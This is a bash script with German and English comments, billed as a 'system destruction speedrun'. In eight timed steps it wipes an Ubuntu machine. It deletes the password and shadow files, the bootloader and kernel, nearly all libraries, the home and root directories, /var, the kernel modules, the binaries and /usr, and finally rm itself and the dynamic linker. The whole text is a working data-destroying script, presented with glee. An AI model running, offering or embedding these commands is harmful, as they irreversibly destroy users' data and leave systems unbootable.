# === SYSTEM DESTRUCTION SPEEDRUN v2.0 (Chirurgie pur) === hehehehehehhee
# Gemessen mit der internen Bash-Variable $SECONDS (Sekunden).
# holy shit, delete about 200mb smart in 8 seconds, can see how step after step ubuntu desktop just melts :D

echo "=== SPEEDRUN START ==="
SECONDS=0

# Schritt 1: Authentifizierung & Systemd-Services killen (0.01s)
s=$SECONDS
rm -rf /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/pam.d /etc/systemd/system
echo "Step 1 (Auth/Systemd): $((SECONDS-s))s"

# Schritt 2: Bootloader, Kernel & EFI entfernen (0.05s)
s=$SECONDS
rm -rf /boot/vmlinuz-* /boot/initr* /boot/efi/EFI /boot/grub/grub.cfg
echo "Step 2 (Boot/EFI/Kernel): $((SECONDS-s))s"

# Schritt 3: ALLE Libraries löschen – außer dem Dynamic Linker (ld-linux)!
# Der Linker wird gebraucht, damit 'rm' und 'find' noch laufen.
s=$SECONDS
find /lib64 -mindepth 1 -maxdepth 1 ! -name 'ld-linux*.so*' -exec rm -rf {} + 2>/dev/null
if [ -d /lib ] && [ ! -L /lib ]; then
    find /lib -mindepth 1 -maxdepth 1 ! -name 'ld-linux*.so*' -exec rm -rf {} + 2>/dev/null
fi
echo "Step 3 (Libs exkl. Linker): $((SECONDS-s))s"

# Schritt 4: Massendaten (Logs, Home-Verzeichnisse, Temp) – /usr bleibt vorerst stehen
s=$SECONDS
rm -rf /var /home /root /tmp/*
echo "Step 4 (Bulk /var,/home,/root): $((SECONDS-s))s"

# Schritt 5: Firmware und Kernel-Module (Hardware-Treiber) killen
s=$SECONDS
rm -rf /lib/modules /lib/firmware
echo "Step 5 (Modules/Firmware): $((SECONDS-s))s"

# Schritt 6: ALLE Binaries killen – aber /bin/rm für den finalen Akt aufheben!
s=$SECONDS
shopt -s extglob
rm -rf /bin/!(rm) /sbin/*
echo "Step 6 (Binaries exkl. rm): $((SECONDS-s))s"

# Schritt 7: Jetzt erst /usr löschen (weil 'find' und andere Tools nicht mehr gebraucht werden)
s=$SECONDS
rm -rf /usr
echo "Step 7 (/usr): $((SECONDS-s))s"

# Schritt 8: DER FINALE DOPPELSCHLAG – rm selbst und den Dynamic Linker exekutieren
s=$SECONDS
rm -f /bin/rm /lib64/ld-linux*.so*
echo "Step 8 (Final - rm & Linker): $((SECONDS-s))s"

echo "=== SPEEDRUN COMPLETE ==="
echo "Gesamtzeit: $SECONDS Sekunden"
echo "System ist tot. Die Shell lebt im RAM. 'exit' zum finalen Beenden."
